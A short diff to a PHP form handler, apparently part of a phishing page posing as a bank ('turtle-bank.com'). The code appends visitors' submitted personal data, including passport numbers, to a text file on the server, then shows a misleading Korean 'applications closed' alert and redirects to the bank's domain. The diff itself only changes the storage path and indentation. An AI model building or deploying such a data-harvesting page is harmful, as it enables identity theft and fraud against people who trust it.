@@ -15,13 +15,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $data .= "여권번호: $passport_number\n";
     $data .= "------------------------\n";
 
-    $file = fopen("user_data.txt", "a");
+    $file = fopen("/home/ubuntu/P_Turtle/user_data.txt", "a");
     fwrite($file, $data);
     fclose($file);
 
     echo "<script type='text/javascript'>
             alert('신청 마감되었습니다.');
             window.location.href = 'http://turtle-bank.com';
-    </script>";
+        </script>";
 }
 ?>
